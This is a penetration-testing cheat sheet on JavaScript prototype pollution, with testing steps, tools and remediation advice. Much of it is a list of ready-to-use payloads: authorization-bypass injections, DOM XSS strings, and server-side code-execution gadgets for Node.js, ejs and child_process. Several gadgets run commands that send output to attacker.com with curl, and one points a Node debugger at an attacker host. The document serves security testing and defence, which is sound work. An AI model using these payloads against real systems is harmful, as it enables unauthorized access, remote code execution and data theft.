# JavaScript Prototype Pollution

## Overview
Prototype Pollution is a JavaScript vulnerability where an attacker can inject properties into `Object.prototype`, the base prototype shared by all JavaScript objects. It occurs because JavaScript's prototype chain allows property lookups to climb up to `Object.prototype`, and many common patterns for merging or parsing objects fail to validate keys like `__proto__`, `constructor`, and `prototype`. Depending on the application, this can lead to property injection, logic bypasses, DOM XSS, or even server-side Remote Code Execution (RCE) when the vulnerable code runs in Node.js.

## How It Works
JavaScript objects inherit properties from their prototype chain. When you access `obj.foo`, the engine first checks `obj` itself, then `obj.__proto__` (which for plain objects is `Object.prototype`), and so on. If an attacker can set `Object.prototype.isAdmin = true`, then every object in the application will appear to have `isAdmin === true` unless the object explicitly defines that property itself. The vulnerability is triggered by functions that recursively merge or assign object properties from attacker-controlled input (like JSON, URL query parameters, or form data) without filtering special keys.

Common vulnerable merge pattern:
```javascript
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object') {
      target[key] = merge(target[key] || {}, source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}
// Attacker input: {"__proto__":{"admin":true}}
merge({}, JSON.parse(attackerInput));
// Now {} .admin === true for ALL objects
```

## Impact
- Property injection into all JavaScript objects, bypassing authorization checks
- DOM XSS when polluted properties are later used in `innerHTML`, `eval()`, `document.write()`, etc.
- Logic bypass (e.g., `isAdmin`, `isAuthenticated`, `debug` flags)
- Denial of service by polluting properties that affect iteration or type checks
- Server-side RCE via PP2RCE (Prototype Pollution to Remote Code Execution) in Node.js
- Template injection when polluted properties reach templating engines
- File write/read on Node.js via polluted options passed to `fs` functions

## Where to Look
- Deep merge / extend / assign utility functions (lodash `merge`, jQuery `extend`, `hoek`)
- URL query string parsers that support nested objects: `?a[__proto__][x]=1` or `?a.__proto__.x=1`
- JSON bodies parsed with recursive property assignment
- Path-based property setters: `_.set(obj, path, value)` where `path` is user-controlled
- Configuration object builders that accept user input
- Server-side: npm packages `merge`, `lodash` < 4.17.13, `hoek` < 5.0.3, `minimist`

## Testing Steps
1. Identify parameters that accept nested object notation: JSON bodies, query strings like `a[b][c]=v`, form data.
2. Inject `__proto__` via query string:
   ```
   GET /?__proto__[injected]=polluted HTTP/1.1
   ```
3. Inject via JSON body:
   ```json
   {"__proto__": {"injected": "polluted"}}
   ```
4. After injection, check if a fresh `{}` object has the property:
   ```javascript
   // Open browser console after sending request
   let obj = {};
   console.log(obj.injected); // should be "polluted" if vulnerable
   ```
5. Try `constructor.prototype` as an alternative path:
   ```json
   {"constructor": {"prototype": {"injected": "polluted"}}}
   ```
6. Look for authorization bypasses: inject `isAdmin`, `role`, `authenticated`, `debug`:
   ```json
   {"__proto__": {"isAdmin": true, "role": "admin"}}
   ```
7. Test for DOM XSS sinks that may use polluted properties:
   ```json
   {"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>", "src": "1", "href": "javascript:alert(1)"}}
   ```
8. On Node.js targets, test PP2RCE via `child_process.spawn` options pollution:
   ```json
   {"__proto__": {"shell": "node", "env": {"NODE_OPTIONS": "--inspect=attacker.com:4444"}}}
   ```
9. Use `ppmap` or `pp-finder` to automatically detect prototype pollution gadgets in loaded scripts.
10. Test `Array.prototype` pollution as well: `{"constructor":{"prototype":{"0":"polluted"}}}`.

## Payloads / Techniques

Basic pollution via JSON:
```json
{"__proto__": {"polluted": true}}
```

Alternative path via constructor:
```json
{"constructor": {"prototype": {"polluted": true}}}
```

URL query string — qs library syntax:
```
?__proto__[polluted]=1
?constructor[prototype][polluted]=1
?__proto__.polluted=1
```

Authorization bypass:
```json
{"__proto__": {"isAdmin": true, "isAuthenticated": true, "role": "superadmin", "debug": true}}
```

DOM XSS via polluted property (when sink does `element[key] = value`):
```json
{"__proto__": {"innerHTML": "<img src=x onerror=alert(document.domain)>"}}
```

PP2RCE via NODE_OPTIONS (Node.js server-side):
```json
{"__proto__": {"NODE_OPTIONS": "--require /proc/self/cmdline"}}
```

PP2RCE via `child_process.spawn` `shell` option:
```json
{"__proto__": {"shell": "/proc/self/exe", "argv0": "node", "env": {"NODE_OPTIONS": "--inspect=0.0.0.0:9229"}}}
```

PP2RCE via `execArgv` (triggers code at process spawn):
```json
{"__proto__": {"execArgv": ["--eval", "require('child_process').execSync('curl https://attacker.com/$(id)')"]}}
```

PP2RCE via `ejs` template engine (if used server-side):
```json
{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id | curl -d @- https://attacker.com');x"}}
```

PP2RCE via `Handlebars` template engine:
```json
{"__proto__": {"__defineGetter__": {"__lookupSetter__": 1}}}
```

Pollution via lodash `_.set()` path traversal:
```javascript
_.set({}, "__proto__.admin", true)
_.set({}, "constructor.prototype.admin", true)
```

## Burp Suite Tips
- Use **Param Miner** extension to discover prototype pollution entry points — it includes a PP scanner.
- In **Repeater**, send JSON bodies with `__proto__` keys and observe response behavior changes.
- Use **Intruder** with a list of dangerous property names (`isAdmin`, `isAuthenticated`, `admin`, `role`, `debug`, `shell`, `argv0`) as pollution values.
- The **JS Miner** extension can identify potentially vulnerable JavaScript patterns loaded by the page.
- Set **Burp Collaborator** as the pollution value for OOB detection: `{"__proto__":{"debug_url":"https://your.collaborator.domain/"}}`.
- Use **DOM Invader** (built into Burp's browser) — it has a dedicated Prototype Pollution scanner that automatically detects pollution and traces it to DOM sinks.

## Tools
- Burp Suite DOM Invader — automated client-side prototype pollution detection
- ppmap (https://github.com/kleiton0x00/ppmap) — prototype pollution gadget finder
- pp-finder — Node.js prototype pollution detection
- lodash-pp-scanner — checks lodash usage for PP
- semgrep — static analysis rules for prototype pollution patterns
- ESLint with security plugins — detect dangerous merge patterns in source
- interactsh — OOB callback receiver for PP2RCE detection

## Remediation
- Freeze `Object.prototype` at application startup: `Object.freeze(Object.prototype)`.
- Use `Object.create(null)` to create dictionaries without a prototype chain when storing user-controlled keys.
- In merge functions, explicitly block dangerous keys:
  ```javascript
  const BLOCKED = new Set(['__proto__', 'constructor', 'prototype']);
  function safeMerge(target, source) {
    for (const key of Object.keys(source)) {
      if (BLOCKED.has(key)) continue;
      // ... rest of merge
    }
  }
  ```
- Use `hasOwnProperty()` instead of `in` when checking object properties.
- Update vulnerable libraries: lodash >= 4.17.21, hoek >= 9.0.0, minimist >= 1.2.6.
- Use `JSON.parse()` with a reviver function that rejects `__proto__` keys.
- Apply Content Security Policy to reduce XSS impact from DOM sinks.
- On Node.js, run with `--disable-proto=delete` or `--disable-proto=throw` flags.

## References
https://portswigger.net/web-security/prototype-pollution
https://portswigger.net/research/server-side-prototype-pollution
https://github.com/BlackFan/client-side-prototype-pollution
https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_for_Client-side_Prototype_Pollution
https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution
https://github.com/nicolo-ribaudo/tc39-proposal-symbol-proto
